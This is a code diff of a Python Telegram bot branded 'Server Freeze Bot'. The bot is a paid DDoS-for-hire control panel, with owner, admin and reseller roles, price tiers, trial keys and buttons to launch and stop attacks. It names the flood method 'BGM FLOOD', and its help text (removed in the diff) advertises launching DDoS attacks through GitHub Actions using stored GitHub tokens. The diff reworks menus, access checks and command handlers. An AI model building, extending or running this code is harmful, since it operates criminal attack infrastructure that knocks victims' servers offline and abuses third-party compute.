@@ -50,6 +50,7 @@ user_states = {}
 USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
 RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}
 
+# Load/Save Functions
 def load_users():
     try:
         with open('users.json', 'r') as f:
@@ -230,6 +231,7 @@ current_attack = attack_state.get("current_attack")
 cooldown_until = attack_state.get("cooldown_until", 0)
 
 logger.info("✅ Part 1: Configurations loaded")
+# Part 2: Helper Functions and Check Functions
 
 def is_owner(user_id):
     return str(user_id) in owners
@@ -241,94 +243,65 @@ def is_reseller(user_id):
     return str(user_id) in resellers
 
 def is_approved_user(user_id):
-    if str(user_id) not in approved_users:
-        return False
-    user_data = approved_users[str(user_id)]
-    expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d %H:%M:%S")
-    if datetime.now() > expiry_date:
-        return False
-    return True
+    if str(user_id) in approved_users:
+        expiry_str = approved_users[str(user_id)].get('expiry_date')
+        if expiry_str:
+            try:
+                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+                if datetime.now() < expiry:
+                    return True
+                else:
+                    del approved_users[str(user_id)]
+                    save_approved_users(approved_users)
+                    return False
+            except:
+                return False
+    return False
 
 def has_access(user_id):
     return is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)
-
-def generate_trial_key(hours):
-    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    expiry = datetime.now() + timedelta(hours=hours)
-    trial_keys[key] = {
-        "hours": hours,
-        "expiry": expiry.strftime("%Y-%m-%d %H:%M:%S"),
-        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "used": False
-    }
-    save_trial_keys(trial_keys)
-    return key
-
-def create_repository(token, repo_name):
-    try:
-        g = Github(token)
-        user = g.get_user()
-        try:
-            repo = user.get_repo(repo_name)
-            return repo, False
-        except:
-            repo = user.create_repo(repo_name, private=False)
-            return repo, True
-    except Exception as e:
-        raise Exception(f"Failed to create repository: {str(e)}")
 
 def format_time_remaining(expiry_str):
     try:
         expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
         remaining = expiry - datetime.now()
-        if remaining.total_seconds() <= 0:
-            return "Expired"
-        days = remaining.days
-        hours = remaining.seconds // 3600
-        minutes = (remaining.seconds % 3600) // 60
-        if days > 0:
-            return f"{days}d {hours}h {minutes}m"
-        elif hours > 0:
-            return f"{hours}h {minutes}m"
+        if remaining.days > 0:
+            return f"{remaining.days} days left"
+        elif remaining.seconds > 3600:
+            hours = remaining.seconds // 3600
+            return f"{hours} hours left"
+        elif remaining.seconds > 60:
+            minutes = remaining.seconds // 60
+            return f"{minutes} minutes left"
         else:
-            return f"{minutes}m"
+            return "Expired"
     except:
-        return "Unknown"
+        return "N/A"
 
-def get_main_menu_keyboard(user_id):
+# Keyboard Functions
+def get_main_keyboard(user_id):
     keyboard = []
-    if is_owner(user_id):
-        keyboard.extend([
-            [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
-            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
-            [InlineKeyboardButton("📊 Bot Statistics", callback_data="statistics")],
-            [InlineKeyboardButton("⚙️ Bot Settings", callback_data="settings")]
-        ])
-    elif is_admin(user_id):
-        keyboard.extend([
-            [InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")],
-            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
-            [InlineKeyboardButton("📊 My Statistics", callback_data="statistics")]
-        ])
-    elif is_reseller(user_id):
-        keyboard.extend([
-            [InlineKeyboardButton("💰 Reseller Panel", callback_data="reseller_panel")],
-            [InlineKeyboardButton("⚔️ Attack Panel", callback_data="attack_panel")],
-            [InlineKeyboardButton("📊 My Account", callback_data="my_account")]
-        ])
-    elif is_approved_user(user_id):
-        keyboard.extend([
-            [InlineKeyboardButton("⚔️ Launch Attack", callback_data="attack_panel")],
-            [InlineKeyboardButton("📊 My Account", callback_data="my_account")],
-            [InlineKeyboardButton("🎁 Redeem Key", callback_data="redeem_key")]
-        ])
+    
+    if not has_access(user_id):
+        keyboard.append([InlineKeyboardButton("🔓 Request Access", callback_data="request_access")])
+        keyboard.append([InlineKeyboardButton("🎁 Redeem Key", callback_data="redeem_key")])
     else:
-        keyboard.extend([
-            [InlineKeyboardButton("📝 Request Access", callback_data="request_access")],
-            [InlineKeyboardButton("🎁 Redeem Trial Key", callback_data="redeem_key")],
-            [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/YourOwnerUsername")]
-        ])
-    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
+        keyboard.append([InlineKeyboardButton("⚔️ Launch Attack", callback_data="start_attack")])
+        keyboard.append([InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack"),
+                        InlineKeyboardButton("📊 Check Status", callback_data="attack_status")])
+    
+    if is_owner(user_id):
+        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")])
+    
+    if is_admin(user_id):
+        keyboard.append([InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")])
+    
+    if is_reseller(user_id):
+        keyboard.append([InlineKeyboardButton("💰 Reseller Panel", callback_data="reseller_panel")])
+    
+    keyboard.append([InlineKeyboardButton("📌 My Access", callback_data="my_account"),
+                    InlineKeyboardButton("❓ Help", callback_data="help")])
+    
     return InlineKeyboardMarkup(keyboard)
 
 def get_owner_panel_keyboard():
@@ -336,21 +309,20 @@ def get_owner_panel_keyboard():
         [InlineKeyboardButton("👥 User Management", callback_data="owner_users")],
         [InlineKeyboardButton("🛡️ Admin Management", callback_data="owner_admins")],
         [InlineKeyboardButton("💰 Reseller Management", callback_data="owner_resellers")],
-        [InlineKeyboardButton("🔑 Server Management", callback_data="owner_servers")],
-        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
-        [InlineKeyboardButton("📢 Broadcast Message", callback_data="owner_broadcast")],
-        [InlineKeyboardButton("⚙️ System Settings", callback_data="owner_settings")],
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
+        [InlineKeyboardButton("🔑 Token Management", callback_data="owner_servers")],
+        [InlineKeyboardButton("📢 Broadcast", callback_data="owner_broadcast")],
+        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 def get_admin_panel_keyboard():
     keyboard = [
-        [InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
         [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
+        [InlineKeyboardButton("👥 User List", callback_data="list_users")],
         [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="admin_genkey")],
-        [InlineKeyboardButton("📊 View Statistics", callback_data="admin_stats")],
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
+        [InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -358,19 +330,10 @@ def get_reseller_panel_keyboard():
     keyboard = [
         [InlineKeyboardButton("➕ Add User", callback_data="reseller_add")],
         [InlineKeyboardButton("➖ Remove User", callback_data="reseller_remove")],
-        [InlineKeyboardButton("📋 My Users", callback_data="reseller_myusers")],
+        [InlineKeyboardButton("👥 My Users", callback_data="reseller_myusers")],
         [InlineKeyboardButton("💳 My Credits", callback_data="reseller_credits")],
-        [InlineKeyboardButton("💰 Price List", callback_data="reseller_prices")],
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-def get_attack_panel_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("🚀 Launch Attack", callback_data="start_attack")],
-        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
-        [InlineKeyboardButton("📊 Check Status", callback_data="attack_status")],
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
+        [InlineKeyboardButton("💰 Prices", callback_data="reseller_prices")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -378,7 +341,8 @@ def get_user_management_keyboard():
     keyboard = [
         [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
         [InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
-        [InlineKeyboardButton("📋 User List", callback_data="list_users")],
+        [InlineKeyboardButton("👥 User List", callback_data="list_users")],
+        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
         [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -387,7 +351,7 @@ def get_admin_management_keyboard():
     keyboard = [
         [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin")],
         [InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")],
-        [InlineKeyboardButton("📋 Admin List", callback_data="list_admins")],
+        [InlineKeyboardButton("🛡️ Admin List", callback_data="list_admins")],
         [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -397,7 +361,7 @@ def get_reseller_management_keyboard():
         [InlineKeyboardButton("➕ Add Reseller", callback_data="add_reseller")],
         [InlineKeyboardButton("➖ Remove Reseller", callback_data="remove_reseller")],
         [InlineKeyboardButton("💳 Add Credits", callback_data="add_reseller_credits")],
-        [InlineKeyboardButton("📋 Reseller List", callback_data="list_resellers")],
+        [InlineKeyboardButton("💰 Reseller List", callback_data="list_resellers")],
         [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -406,279 +370,254 @@ def get_server_management_keyboard():
     keyboard = [
         [InlineKeyboardButton("➕ Add Server", callback_data="add_server")],
         [InlineKeyboardButton("➖ Remove Server", callback_data="remove_server")],
-        [InlineKeyboardButton("📋 Server List", callback_data="list_servers")],
+        [InlineKeyboardButton("🔑 Server List", callback_data="list_servers")],
         [InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
         [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 def get_settings_keyboard():
+    maintenance_text = "🔴 Disable" if MAINTENANCE_MODE else "🟢 Enable"
     keyboard = [
         [InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown")],
         [InlineKeyboardButton("🎯 Set Max Attacks", callback_data="set_max_attacks")],
-        [InlineKeyboardButton("🔧 Toggle Maintenance", callback_data="toggle_maintenance")],
+        [InlineKeyboardButton(f"{maintenance_text} Maintenance", callback_data="toggle_maintenance")],
         [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="gen_trial_key")],
         [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
-def get_pending_action_keyboard(user_id):
+def get_attack_panel_keyboard():
     keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")],
-        [InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")],
-        [InlineKeyboardButton("🔙 Back", callback_data="pending_requests")]
+        [InlineKeyboardButton("🚀 Launch Attack", callback_data="start_attack")],
+        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
+        [InlineKeyboardButton("📊 Check Status", callback_data="attack_status")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
-def get_back_keyboard():
-    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
-    return InlineKeyboardMarkup(keyboard)
-
 def get_cancel_keyboard():
-    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
-    return InlineKeyboardMarkup(keyboard)
+    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
+
+def get_back_keyboard():
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
 
 logger.info("✅ Part 2: Helper functions loaded")
 
+# Part 3: Command Handlers
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    username = update.effective_user.username or f"user_{user_id}"
+    user_id = update.effective_user.id if update.effective_user else None
     
-    welcome_text = f"""
-🤖 **WELCOME TO SERVER FREEZE BOT**
-
-👋 Hello @{username}!
-🆔 Your ID: `{user_id}`
-
-"""
-    
-    if is_owner(user_id):
-        welcome_text += "👑 **Your Role**: OWNER\n✅ **Access**: Full Control\n"
-    elif is_admin(user_id):
-        welcome_text += "🛡️ **Your Role**: ADMIN\n✅ **Access**: User Management\n"
-    elif is_reseller(user_id):
-        welcome_text += "💰 **Your Role**: RESELLER\n✅ **Access**: Add Users\n"
-    elif is_approved_user(user_id):
-        user_data = approved_users[str(user_id)]
-        remaining = format_time_remaining(user_data['expiry_date'])
-        welcome_text += f"✅ **Your Status**: APPROVED\n⏰ **Time Left**: {remaining}\n"
-    else:
-        welcome_text += "❌ **Status**: UNAUTHORIZED\n💡 **Tip**: Request access or redeem a key\n"
-    
-    welcome_text += "\n🎯 **Select an option below:**"
-    
-    keyboard = get_main_menu_keyboard(user_id)
+    if not user_id:
+        return
     
     if update.callback_query:
-        await update.callback_query.edit_message_text(welcome_text, reply_markup=keyboard, parse_mode='Markdown')
+        query = update.callback_query
+        username = query.from_user.username or query.from_user.first_name or "User"
+        
+        text = f"""
+🔥 **SERVER FREEZE BOT** 🔥
+
+Welcome back, {username}!
+
+Select an option below:
+"""
+        
+        keyboard = get_main_keyboard(user_id)
+        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
     else:
-        await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode='Markdown')
+        username = update.effective_user.username or update.effective_user.first_name or "User"
+        
+        # Notify owners of new user starting bot
+        if not has_access(user_id):
+            pending = load_pending_users()
+            already_pending = any(req.get('user_id') == user_id for req in pending)
+            
+            if not already_pending:
+                for owner_id in owners.keys():
+                    try:
+                        await context.bot.send_message(
+                            chat_id=int(owner_id),
+                            text=f"📢 **NEW USER STARTED BOT**\n\n"
+                                 f"👤 Username: @{username}\n"
+                                 f"🆔 ID: `{user_id}`\n"
+                                 f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                                 f"User needs to request access.",
+                            parse_mode='Markdown'
+                        )
+                    except:
+                        pass
+        
+        text = f"""
+🔥 **SERVER FREEZE BOT** 🔥
+
+Welcome, {username}!
+
+🎯 **Method**: BGM FLOOD
+⚡ **Cooldown**: {COOLDOWN_DURATION}s
+🔥 **Max attacks**: {MAX_ATTACKS}
+
+Select an option:
+"""
+        
+        keyboard = get_main_keyboard(user_id)
+        await update.message.reply_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = """
-ℹ️ **BOT HELP & COMMANDS**
+    text = """
+❓ **HELP & COMMANDS**
 
-**🎯 Main Features:**
-• 🚀 Launch DDoS attacks via GitHub Actions
-• ⏱️ Configurable cooldown & attack limits
-• 👥 Multi-level user management system
-• 💰 Reseller system with credit management
-• 🎁 Trial key generation & redemption
+**User Commands:**
+/start - Start the bot
+/help - Show this help
+/myaccess - Check access status
+/status - Check attack status
+/stop - Stop attack
+/redeem <key> - Redeem trial key
 
-**📱 Button Interface:**
-Use the buttons below each message to navigate easily!
+**Attack:**
+• Launch via buttons
+• Real-time status
+• Stop anytime
 
-**⌨️ Quick Commands:**
-/start - Main menu
-/id - Get your user ID
-/myaccess - Check your access level
-/status - View attack status
-/stop - Stop active attack
-/redeem <KEY> - Redeem trial key
+**Access:**
+Request access or redeem key
 
-**👑 Owner Commands:**
-/addtoken <token> - Add GitHub server
-/removetoken <number> - Remove server
-/tokens - List all servers
-/binary_upload - Upload binary file
-/broadcast - Send broadcast message
-
-**🆘 Need Help?**
-Contact the bot owner for assistance!
+**Support:**
+Contact owner
 """
     
-    keyboard = get_back_keyboard()
-    
     if update.callback_query:
-        await update.callback_query.edit_message_text(help_text, reply_markup=keyboard, parse_mode='Markdown')
+        query = update.callback_query
+        keyboard = get_back_keyboard()
+        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
     else:
-        await update.message.reply_text(help_text, reply_markup=keyboard, parse_mode='Markdown')
+        await update.message.reply_text(text, parse_mode='Markdown')
 
 async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = update.effective_user.username or "No username"
     
-    id_text = f"""
-🆔 **YOUR INFORMATION**
+    text = f"""
+👤 **YOUR INFORMATION**
 
+🆔 User ID: `{user_id}`
 👤 Username: @{username}
-🔢 User ID: `{user_id}`
-📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-
-💡 Send this ID to the owner to get access!
+📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
     
-    await update.message.reply_text(id_text, parse_mode='Markdown')
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    access_text = "📊 **YOUR ACCESS STATUS**\n\n"
+    text = "📌 **YOUR ACCESS**\n\n"
     
     if is_owner(user_id):
         owner_data = owners[str(user_id)]
-        access_text += f"""
-👑 **Role**: OWNER
-✅ **Access**: Full Control
-📅 **Added**: {owner_data.get('added_date', 'N/A')}
-🔑 **Type**: {'Primary' if owner_data.get('is_primary') else 'Secondary'}
-"""
+        text += f"👑 **Role**: Owner\n"
+        text += f"✅ **Status**: Full Access\n"
+        text += f"📅 **Since**: {owner_data.get('added_date', 'N/A')}\n"
     elif is_admin(user_id):
         admin_data = admins[str(user_id)]
-        access_text += f"""
-🛡️ **Role**: ADMIN
-✅ **Access**: User Management
-📅 **Added**: {admin_data.get('added_date', 'N/A')}
-"""
+        text += f"🛡️ **Role**: Admin\n"
+        text += f"✅ **Status**: Active\n"
+        text += f"📅 **Since**: {admin_data.get('added_date', 'N/A')}\n"
     elif is_reseller(user_id):
         reseller_data = resellers[str(user_id)]
-        credits = reseller_data.get('credits', 0)
-        access_text += f"""
-💰 **Role**: RESELLER
-💳 **Credits**: {credits} days
-📅 **Added**: {reseller_data.get('added_date', 'N/A')}
-👥 **Users Added**: {reseller_data.get('users_added', 0)}
-"""
+        text += f"💰 **Role**: Reseller\n"
+        text += f"💳 **Credits**: {reseller_data.get('credits', 0)} days\n"
+        text += f"👥 **Users Added**: {reseller_data.get('users_added', 0)}\n"
+        text += f"📅 **Since**: {reseller_data.get('added_date', 'N/A')}\n"
     elif is_approved_user(user_id):
         user_data = approved_users[str(user_id)]
-        expiry = user_data['expiry_date']
-        remaining = format_time_remaining(expiry)
-        access_text += f"""
-✅ **Role**: APPROVED USER
-⏰ **Time Remaining**: {remaining}
-📅 **Expiry Date**: {expiry}
-👤 **Added By**: {user_data.get('added_by', 'Unknown')}
-"""
+        text += f"✅ **Status**: Active User\n"
+        text += f"⏰ **Expires**: {format_time_remaining(user_data['expiry_date'])}\n"
+        text += f"📅 **Added**: {user_data.get('added_date', 'N/A')}\n"
+        text += f"📋 **Plan**: {user_data.get('plan', 'N/A')}\n"
     else:
-        access_text += """
-❌ **Status**: UNAUTHORIZED
-
-You don't have access to use this bot.
-Please:
-1️⃣ Request access from admin
-2️⃣ Redeem a trial key
-3️⃣ Contact a reseller
-"""
+        text += "❌ **Status**: No Access\n\n"
+        text += "Use /start to request access or redeem a key."
     
-    keyboard = get_back_keyboard()
-    await update.message.reply_text(access_text, reply_markup=keyboard, parse_mode='Markdown')
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global current_attack, cooldown_until
     
-    status_text = "📊 **ATTACK STATUS**\n\n"
+    text = "📊 **ATTACK STATUS**\n\n"
     
     if MAINTENANCE_MODE:
-        status_text += "🔧 **Maintenance Mode**: ON\n"
-        status_text += "⚠️ All attacks are currently disabled.\n"
+        text += "🔧 **Status**: Maintenance Mode\n"
+        text += "All attacks disabled.\n"
     elif current_attack:
-        status_text += f"""🚀 **Status**: ACTIVE ATTACK
-🎯 **Target**: `{current_attack.get('target', 'N/A')}`
-🔌 **Port**: `{current_attack.get('port', 'N/A')}`
-⏱️ **Duration**: `{current_attack.get('time', 'N/A')}s`
-👤 **Started By**: @{current_attack.get('user', 'Unknown')}
-⏰ **Started At**: `{current_attack.get('start_time', 'N/A')}`
-"""
+        text += f"🚀 **Status**: Attack Running\n"
+        text += f"🎯 **Target**: `{current_attack.get('target')}`\n"
+        text += f"🔌 **Port**: `{current_attack.get('port')}`\n"
+        text += f"⏱️ **Duration**: {current_attack.get('duration')}s\n"
+        text += f"👤 **User**: {current_attack.get('user_id')}\n"
     elif cooldown_until > time.time():
-        remaining_cooldown = int(cooldown_until - time.time())
-        status_text += f"""⏳ **Status**: COOLDOWN PERIOD
-⏱️ **Wait Time**: `{remaining_cooldown}s`
-💡 Please wait before next attack
-"""
+        remaining = int(cooldown_until - time.time())
+        text += f"⏳ **Status**: Cooldown\n"
+        text += f"⏱️ **Remaining**: {remaining}s\n"
     else:
-        status_text += """✅ **Status**: READY TO ATTACK
-🎯 All systems operational!
-🚀 Ready to launch attack
-"""
+        text += "✅ **Status**: Ready\n"
+        text += "No active attacks.\n"
     
-    status_text += f"\n⚙️ **Server Configuration**:\n"
-    status_text += f"🔑 **Active Servers**: `{len(github_tokens)}`\n"
-    status_text += f"⏳ **Cooldown Duration**: `{COOLDOWN_DURATION}s`\n"
-    status_text += f"🎯 **Max Attacks Limit**: `{MAX_ATTACKS}`\n"
-    
-    keyboard = get_back_keyboard()
+    text += f"\n🔑 **Servers**: {len(github_tokens)}\n"
+    text += f"⏳ **Cooldown**: {COOLDOWN_DURATION}s\n"
     
     if update.callback_query:
-        await update.callback_query.edit_message_text(status_text, reply_markup=keyboard, parse_mode='Markdown')
+        query = update.callback_query
+        keyboard = get_back_keyboard()
+        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
     else:
-        await update.message.reply_text(status_text, reply_markup=keyboard, parse_mode='Markdown')
+        await update.message.reply_text(text, parse_mode='Markdown')
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global current_attack
     user_id = update.effective_user.id
     
     if not has_access(user_id):
-        await update.message.reply_text("❌ ACCESS DENIED")
+        await update.message.reply_text("❌ **ACCESS DENIED**\n\nYou need access to use this command.")
         return
     
     if not current_attack:
         await update.message.reply_text("⚠️ No active attack to stop.")
         return
     
-    if not (is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id):
-        await update.message.reply_text("❌ You can only stop your own attacks!")
-        return
-    
-    current_attack = None
-    save_attack_state()
-    
-    await update.message.reply_text("✅ **ATTACK STOPPED**\n\nThe current attack has been terminated.", parse_mode='Markdown')
+    if is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id:
+        current_attack = None
+        save_attack_state()
+        await update.message.reply_text("✅ **ATTACK STOPPED**\n\nAttack has been terminated.")
+    else:
+        await update.message.reply_text("❌ You can only stop your own attacks.")
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    if len(context.args) != 1:
-        await update.message.reply_text(
-            "❌ **Invalid syntax**\n\n"
-            "Usage: `/redeem <KEY>`\n"
-            "Example: `/redeem ABCD1234EFGH`",
-            parse_mode='Markdown'
-        )
+    if not context.args:
+        await update.message.reply_text("❌ **INVALID USAGE**\n\nUsage: /redeem <key>")
         return
     
-    key = context.args[0].upper()
+    key = context.args[0]
     
     if key not in trial_keys:
-        await update.message.reply_text("❌ Invalid trial key!")
+        await update.message.reply_text("❌ **INVALID KEY**\n\nThe key doesn't exist or has expired.")
         return
     
     key_data = trial_keys[key]
     
     if key_data.get('used'):
-        await update.message.reply_text("❌ This key has already been used!")
+        await update.message.reply_text("❌ **KEY USED**\n\nThis key has already been redeemed.")
         return
     
-    expiry = datetime.strptime(key_data['expiry'], "%Y-%m-%d %H:%M:%S")
-    if datetime.now() > expiry:
-        await update.message.reply_text("❌ This key has expired!")
-        return
-    
-    hours = key_data['hours']
-    new_expiry = datetime.now() + timedelta(hours=hours)
+    hours = key_data.get('hours', 24)
+    expiry = datetime.now() + timedelta(hours=hours)
     
     approved_users[str(user_id)] = {
         "username": update.effective_user.username or f"user_{user_id}",
-        "expiry_date": new_expiry.strftime("%Y-%m-%d %H:%M:%S"),
+        "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
         "added_by": "trial_key",
         "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "plan": f"{hours}h trial"
@@ -691,19 +630,20 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_approved_users(approved_users)
     save_trial_keys(trial_keys)
     
-    success_text = f"""
-✅ **TRIAL KEY ACTIVATED!**
+    text = f"""
+✅ **KEY REDEEMED!**
 
-🎁 Duration: {hours} hours
-⏰ Valid Until: {new_expiry.strftime("%Y-%m-%d %H:%M:%S")}
+⏰ **Duration**: {hours} hours
+📅 **Expires**: {expiry.strftime('%Y-%m-%d %H:%M:%S')}
 
-You now have access to the bot! 🎉
-Use /start to begin.
+Use /start to begin!
 """
     
-    await update.message.reply_text(success_text, parse_mode='Markdown')
+    await update.message.reply_text(text, parse_mode='Markdown')
 
 logger.info("✅ Part 3: Command handlers loaded")
+
+# Part 4: Button/Callback Handlers and Panel Functions
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -712,242 +652,201 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     data = query.data
     
+    # Main navigation
     if data == "main_menu":
         await start(update, context)
-    
     elif data == "help":
         await help_command(update, context)
     
+    # Access control panels
     elif data == "owner_panel":
         if not is_owner(user_id):
-            await query.answer("❌ ACCESS DENIED", show_alert=True)
+            await query.answer("❌ ACCESS DENIED - Owner only!", show_alert=True)
             return
         await show_owner_panel(query)
     
     elif data == "admin_panel":
         if not is_admin(user_id):
-            await query.answer("❌ ACCESS DENIED", show_alert=True)
+            await query.answer("❌ ACCESS DENIED - Admin only!", show_alert=True)
             return
         await show_admin_panel(query)
     
     elif data == "reseller_panel":
         if not is_reseller(user_id):
-            await query.answer("❌ ACCESS DENIED", show_alert=True)
+            await query.answer("❌ ACCESS DENIED - Reseller only!", show_alert=True)
             return
         await show_reseller_panel(query)
     
-    elif data == "attack_panel":
-        if not has_access(user_id):
-            await query.answer("❌ ACCESS DENIED", show_alert=True)
-            return
-        await show_attack_panel(query)
-    
-    elif data == "owner_users":
-        await show_user_management(query)
-    
-    elif data == "owner_admins":
-        await show_admin_management(query)
-    
-    elif data == "owner_resellers":
-        await show_reseller_management(query)
-    
-    elif data == "owner_servers":
-        await show_server_management(query)
-    
-    elif data == "pending_requests":
-        if not (is_owner(user_id) or is_admin(user_id)):
-            await query.answer("❌ ACCESS DENIED", show_alert=True)
-            return
-        await show_pending_requests(query)
-    
-    elif data == "owner_broadcast":
-        await start_broadcast(query, user_id)
-    
-    elif data == "owner_settings" or data == "settings":
-        await show_settings(query)
-    
-    elif data == "add_user":
-        await init_add_user(query, user_id)
-    
-    elif data == "remove_user":
-        await init_remove_user(query, user_id)
-    
-    elif data == "list_users":
-        await show_users_list(query)
-    
-    elif data == "add_server":
-        await init_add_server(query, user_id)
-    
-    elif data == "remove_server":
-        await init_remove_server(query, user_id)
-    
-    elif data == "list_servers":
-        await show_servers_list(query)
-    
-    elif data == "upload_binary":
-        await init_upload_binary(query, user_id)
-    
-    elif data == "set_cooldown":
-        await init_set_cooldown(query, user_id)
-    
-    elif data == "set_max_attacks":
-        await init_set_max_attacks(query, user_id)
-    
-    elif data == "toggle_maintenance":
-        await toggle_maintenance(query, user_id)
-    
-    elif data == "gen_trial_key" or data == "admin_genkey":
-        await init_gen_trial_key(query, user_id)
-    
+    # Attack panel and actions
     elif data == "start_attack":
-        await init_attack(query, user_id)
+        if not has_access(user_id):
+            await query.answer("❌ NO ACCESS - Request access first!", show_alert=True)
+            return
+        await init_attack(query, user_id, context)
     
     elif data == "stop_attack":
+        if not has_access(user_id):
+            await query.answer("❌ NO ACCESS - You need access!", show_alert=True)
+            return
         await stop_attack_callback(query, user_id)
     
     elif data == "attack_status":
         await status_command(update, context)
     
-    elif data == "statistics" or data == "admin_stats":
-        await show_statistics(query)
+    # Management panels
+    elif data == "owner_users":
+        await show_user_management(query)
+    elif data == "owner_admins":
+        await show_admin_management(query)
+    elif data == "owner_resellers":
+        await show_reseller_management(query)
+    elif data == "owner_servers":
+        await show_server_management(query)
+    elif data == "settings":
+        await show_settings(query)
     
-    elif data == "my_account":
-        await show_my_account(query, user_id)
+    # Pending requests
+    elif data == "pending_requests":
+        if not (is_owner(user_id) or is_admin(user_id)):
+            await query.answer("❌ ACCESS DENIED!", show_alert=True)
+            return
+        await show_pending_requests(query, context)
     
+    # User management
+    elif data == "add_user":
+        await init_add_user(query, user_id)
+    elif data == "remove_user":
+        await init_remove_user(query, user_id)
+    elif data == "list_users":
+        await show_users_list(query)
+    
+    # Server management
+    elif data == "add_server":
+        await init_add_server(query, user_id)
+    elif data == "remove_server":
+        await init_remove_server(query, user_id)
+    elif data == "list_servers":
+        await show_servers_list(query)
+    elif data == "upload_binary":
+        await init_upload_binary(query, user_id)
+    
+    # Settings
+    elif data == "set_cooldown":
+        await init_set_cooldown(query, user_id)
